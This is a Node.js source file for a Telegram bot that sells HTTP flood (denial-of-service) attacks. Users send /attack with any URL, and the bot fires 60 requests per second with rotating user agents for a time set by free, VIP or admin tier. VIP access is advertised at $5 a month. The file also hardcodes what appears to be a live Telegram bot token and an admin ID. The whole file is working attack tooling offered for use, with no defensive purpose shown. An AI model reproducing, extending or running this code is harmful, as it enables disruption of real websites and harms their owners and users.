const os = require('os');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

// 📂 User-Agent Files
const userAgentFiles = [
  path.join(__dirname, 'HanX.txt'),
  path.join(__dirname, 'ua.txt')
];

// 📥 Load User-Agents
function loadUserAgents(files) {
  let agents = [];
  for (const file of files) {
    try {
      const data = fs.readFileSync(file, 'utf8');
      const list = data.split('\n').map(a => a.trim()).filter(Boolean);
      agents.push(...list);
    } catch (err) {
      console.warn(`⚠️ Unable to read: ${file}`, err.message);
    }
  }
  return agents;
}

// 🎲 Get Random UA
function getRandomUserAgent(agents) {
  return agents.length === 0
    ? 'Mozilla/5.0 (default user agent)'
    : agents[Math.floor(Math.random() * agents.length)];
}

const userAgents = loadUserAgents(userAgentFiles);
const telegramToken = '8463606454:AAGRl7u0PTKHlBBB4jqQESBpsz73smyx2dE'; // 🛑 ដូរទៅ token របស់អ្នក
const bot = new TelegramBot(telegramToken, { polling: true });

const adminIds = [7893036607]; // 👑 ដូរជាមួយ Telegram ID របស់អ្នកជាអ្នកគ្រប់គ្រង
const VIP_FILE = path.join(__dirname, 'vip.json');

// 📁 VIP Logic
function getVipData() {
  try {
    return JSON.parse(fs.readFileSync(VIP_FILE, 'utf8'));
  } catch {
    return {};
  }
}

function saveVipData(data) {
  fs.writeFileSync(VIP_FILE, JSON.stringify(data, null, 2));
}

function isVip(userId) {
  const vipData = getVipData();
  const user = vipData[userId];
  if (!user) return false;
  return new Date(user.expire) > new Date();
}

// 🚀 Attack Function
function sendAttackRequest(targetUrl) {
  const headers = {
    'User-Agent': getRandomUserAgent(userAgents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
  };

  return fetch(targetUrl, { headers })
    .then(res => {
      console.log(`⚡️ Attack: ${targetUrl} | Status: ${res.status}`);
      return res.status;
    })
    .catch(err => {
      console.error(`❌ Failed: ${targetUrl} | Error: ${err.message}`);
    });
}

let attackTimer = null;
let countdownTimer = null;
let isAttacking = false;

const REQUESTS_PER_SECOND = 60;
const ATTACK_DURATION_FREE = 60;           // Free users upper limit (seconds)
const ATTACK_DURATION_VIP = 500;           // VIP users upper limit (seconds)
const ATTACK_DURATION_ADMIN_MAX = 1080000;   // Admin max duration (3 hours in seconds)

// 🛑 Stop Attack
function stopAttack(chatId) {
  clearInterval(attackTimer);
  clearInterval(countdownTimer);
  isAttacking = false;
  if (chatId) bot.sendMessage(chatId, '🛑 Attack stopped.');
}

// ▶️ Start Attack
function startAttack(chatId, url, userId, duration) {
  if (isAttacking) return bot.sendMessage(chatId, '⚠️ An attack is already in progress.');

  isAttacking = true;

  let maxDuration;

  if (adminIds.includes(userId)) {
    maxDuration = ATTACK_DURATION_ADMIN_MAX;
  } else if (isVip(userId)) {
    maxDuration = ATTACK_DURATION_VIP;
  } else {
    maxDuration = ATTACK_DURATION_FREE;
  }

  const attackDuration = parseInt(duration) || ATTACK_DURATION_FREE;

  if (!adminIds.includes(userId) && attackDuration > maxDuration) {
    const isUserVip = isVip(userId);
    return bot.sendMessage(chatId,
      `🚫 អ្នកគឺជា ${isUserVip ? 'VIP' : 'Free'} User មិនអាចវាយលើស ${maxDuration} វិនាទីទេ!\n` +
      `${!isUserVip ? '📩 សូមទាក់ទងអ្នកគ្រប់គ្រង ដើម្បីទិញ VIP។' : ''}`
    );
  }

  let remaining = attackDuration;
  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;

  const attackInfo = () => 
    `🚀 Attack Started!\n🌐 Target: ${url}\n⏰ Time: ${remaining}s / ${attackDuration}s\n🔍 Check: ${checkHostUrl}`;

  bot.sendMessage(chatId, attackInfo()).then(msg => {
    countdownTimer = setInterval(() => {
      remaining--;
      if (remaining <= 0) {
        stopAttack(chatId);
        bot.sendMessage(chatId, `✅ Attack finished (${attackDuration}s)`);
      } else {
        bot.editMessageText(attackInfo(), {
          chat_id: chatId,
          message_id: msg.message_id
        }).catch(() => {});
      }
    }, 1000);

    attackTimer = setInterval(() => {
      for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
        sendAttackRequest(url);
      }
    }, 1000);
  });
}

// 📌 Commands handlers

// /attack command
bot.onText(/\/attack(?:\s+([^\s]+))?(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetUrl = match[1];
  const duration = match[2];

  if (!targetUrl || !/^https?:\/\//i.test(targetUrl)) {
    return bot.sendMessage(chatId, 'Example:\n/attack https://example.com 120');
  }

  startAttack(chatId, targetUrl, userId, duration);
});

// /stop command (admin only)
bot.onText(/\/stop/, msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminIds.includes(userId)) {
    return bot.sendMessage(chatId, '❌ You do not have permission to stop the attack.');
  }

  if (!isAttacking) {
    return bot.sendMessage(chatId, '🤖 No attack is currently running.');
  }

  stopAttack(chatId);
});

// /start or /help - show help menu
bot.onText(/\/(start|help)/, msg => {
  const help = 
`Bot Commands:
➤ /attack [url] [seconds] – Start attack (admins up to 3hrs)
➤ /stop – Stop the attack (admin only)
➤ /check [url] – Check site status
➤ /buyvip – Buy VIP membership info
➤ /viplist – View VIP users (admin only)
➤ /addvip <id> <days> – Add VIP user (admin only)
➤ /removevip <id> – Remove VIP user (admin only)`;

  bot.sendMessage(msg.chat.id, help);
});

// /check command
bot.onText(/\/check(?:\s+(https?:\/\/[^\s]+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(chatId, 'Example:\n/check https://example.com');
  }

  const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
  bot.sendMessage(chatId, `🔍 Check this URL:\n${checkUrl}`);
});

// /buyvip command
bot.onText(/\/buyvip/, msg => {
  bot.sendMessage(msg.chat.id,
    `💎 VIP Membership
➤ Time Limit: 500s attacks
➤ Access: Exclusive Commands
💰 Price: $5/month
📩 Contact admin: @Zen_Rocert`
  );
});

// /viplist command (admin only)
bot.onText(/\/viplist/, msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminIds.includes(userId)) return;

  const vipData = getVipData();
  const list = Object.entries(vipData)
    .map(([id, info]) => `👤 ${id} - expires: ${new Date(info.expire).toLocaleString()}`)
    .join('\n') || 'No VIPs yet.';

  bot.sendMessage(chatId, `📜 VIP List:\n${list}`);
});

// /addvip command (admin only)
bot.onText(/\/addvip (\d+) (\d+)/, (msg, match) => {
  const userId = msg.from.id;
  if (!adminIds.includes(userId)) return;

  const targetId = match[1];
  const days = parseInt(match[2], 10);

  const vipData = getVipData();
  const now = new Date();
  const currentExpire = vipData[targetId]?.expire ? new Date(vipData[targetId].expire) : now;
  const baseDate = currentExpire > now ? currentExpire : now;

  const newExpire = new Date(baseDate.getTime() + days * 86400000);
  vipData[targetId] = { expire: newExpire.toISOString() };
  saveVipData(vipData);

  bot.sendMessage(msg.chat.id, `✅ Added VIP: ${targetId} until ${newExpire.toLocaleString()}`);
});

// /removevip command (admin only)
bot.onText(/\/removevip (\d+)/, (msg, match) => {
  const userId = msg.from.id;
  if (!adminIds.includes(userId)) return;

  const targetId = match[1];
  const vipData = getVipData();

  if (vipData[targetId]) {
    delete vipData[targetId];
    saveVipData(vipData);
    bot.sendMessage(msg.chat.id, `❌ Removed VIP: ${targetId}`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ User ID ${targetId} is not VIP.`);
  }
});
